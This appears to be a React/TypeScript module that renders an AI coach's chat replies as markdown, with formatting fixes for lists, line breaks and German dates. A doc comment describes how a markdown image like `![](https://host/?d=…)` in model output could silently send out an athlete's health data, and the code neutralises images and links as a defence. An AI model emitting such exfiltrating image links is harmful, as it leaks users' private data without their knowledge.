import type { ReactNode } from 'react'
import type { Components } from 'react-markdown'

/** A paragraph of the coach's message, with space before the next one. */
const paragraph = ({ children }: { children?: ReactNode }) => (
  <p className="mt-2 first:mt-0">{children}</p>
)

// Bullets and an indent: Tailwind's preflight takes both off every list, and
// the paragraphs' margins too, so the coach's lists and paragraphs ran
// together (ai-trainer-ops#308).
const LIST = 'mt-2 first:mt-0 space-y-1 pl-5 marker:text-gray-500'

/**
 * How the coach's message body is rendered as markdown.
 *
 * Headings become plain paragraphs so the chat keeps one font size.
 *
 * `img` and `a` render inert (#677). react-markdown renders no raw HTML
 * without `rehype-raw`, so this was never an XSS question — it is an egress
 * one. A rendered `![](https://host/?d=…)` fetches that URL the moment the
 * message paints, with no click and nothing visible to the athlete, and the
 * coach prompt carries the athlete's health data by construction (#499). Since
 * the LLM has no tool-calling, a remote reference in its reply is the *only*
 * way text the model produces can leave the browser. The CSP in `nginx.conf`
 * is the second, independent layer.
 *
 * Nothing is lost by this: the coach's citations do not come through markdown
 * at all — they arrive structured on `msg.sources` and are rendered as real
 * links in `AIChat`. So there is no legitimate reason for a link or an image in
 * the message body, and the alt/label text is kept so nothing disappears
 * silently either.
 *
 * It lives in its own module rather than in `AIChat.tsx` so the egress
 * guarantee can be tested without standing up the chat component and its
 * mocks — and because exporting a non-component from a component file breaks
 * fast refresh.
 */
export const MARKDOWN_COMPONENTS: Components = {
  h1: paragraph,
  h2: paragraph,
  h3: paragraph,
  h4: paragraph,
  h5: paragraph,
  h6: paragraph,
  p: paragraph,
  ul: ({ children }) => <ul className={`${LIST} list-disc`}>{children}</ul>,
  ol: ({ children, start }) => (
    <ol start={start} className={`${LIST} list-decimal`}>
      {children}
    </ol>
  ),
  img: ({ alt }) => (
    <span className="text-gray-400 italic">{alt ? `[image: ${alt}]` : '[image]'}</span>
  ),
  a: ({ href, children }) => (
    <span>
      {children}
      {href ? <span className="text-gray-400"> ({href})</span> : null}
    </span>
  ),
}

type MarkdownNode = { type: string; value?: string; children?: MarkdownNode[] }

/** Each line break in a text as a break of its own, below ``node``. */
function breakLines(node: MarkdownNode): void {
  if (!node.children) return
  node.children = node.children.flatMap((child) => {
    if (child.type !== 'text' || !child.value?.includes('\n')) {
      breakLines(child)
      return [child]
    }
    return child.value
      .split('\n')
      .flatMap((line, i) => [...(i ? [{ type: 'break' }] : []), { type: 'text', value: line }])
  })
}

/**
 * A line break in the coach's text stays one (ai-trainer-ops#308).
 *
 * Markdown makes a single line break a space: the opening message's lines ran
 * on in one wrapped line. A remark plugin rather than `whitespace-pre-line`:
 * in a list with blank lines between its items, the line breaks between the
 * item's blocks would show as empty lines. Code is left alone: it is not text.
 */
export function remarkLineBreaks() {
  return (tree: MarkdownNode) => breakLines(tree)
}

// A list item: "-", "*" or "+", or a number with "." or ")", then a space.
const BULLET = /^\s*[-*+](?:\s|$)/
const NUMBERED = /^\s*(\d{1,9})[.)](?:\s|$)/
const FENCE = /^\s*(?:```|~~~)/
// "•" as a list marker: the model writes it now and then, and markdown reads
// it as text, so its lines showed the dots without a list.
const DOT_BULLET = /^(\s*)•(?=\s)/
// A German date at the start of a line, or of a bullet's text: "26. April",
// "12. Mai", "6. Sep.". The whole month, or its short form: "1. Juniorenplan"
// stays a list item (review of #1175).
const MONTH =
  '(?:Januar|Jänner|Februar|März|April|Mai|Juni|Juli|August|September|Oktober|November|Dezember' +
  '|Jan|Jän|Feb|Mär|Apr|Jun|Jul|Aug|Sep|Sept|Okt|Nov|Dez)'
const GERMAN_DATE = new RegExp(`^(\\s*(?:[-*+]\\s+)?)(\\d{1,2})\\.(?= ${MONTH}(?!\\p{L}))`, 'u')

/**
 * The coach's text, made ready for markdown (ai-trainer-ops#308).
 *
 * Each list ends before the line that follows it. A line right after a list
 * item belongs to that item in markdown, unless a blank line comes between
 * (CommonMark's lazy continuation). The opening message's assumptions and its
 * pinned-questions sentence became part of the last example that way. A blank
 * line before such a line ends the list. An indented line stays the item's:
 * that one is meant. A numbered line starts a list only where markdown lets
 * one start: after a blank line, in a list, or at 1.
 *
 * A line that starts with "•" is a bullet: the model writes that marker now
 * and then, and markdown would show it as text.
 *
 * A German date at the start of a line keeps its number. "26. April 2027 ist
 * das Rennen" would be item 26 of a list, and "- 12. Mai: Rennen" a list
 * inside a bullet; the dot is escaped instead (review of #1175).
 *
 * Done here, at render time, so the messages already stored show right too.
 * Fenced code is left as written.
 */
export function coachMarkdownSource(text: string): string {
  const lines: string[] = []
  let inList = false
  let inFence = false
  let afterBlank = true
  for (const original of text.split('\n')) {
    let line = original
    if (FENCE.test(line)) {
      inFence = !inFence
    } else if (!inFence) {
      line = line.replace(DOT_BULLET, '$1-').replace(GERMAN_DATE, '$1$2\\.')
      const numbered = NUMBERED.exec(line)
      const item =
        BULLET.test(line) || (numbered !== null && (inList || afterBlank || numbered[1] === '1'))
      if (item) {
        inList = true
      } else if (!line.trim()) {
        inList = false
      } else if (inList && !/^\s/.test(line)) {
        lines.push('')
        inList = false
      }
    }
    afterBlank = !line.trim()
    lines.push(line)
  }
  return lines.join('\n')
}
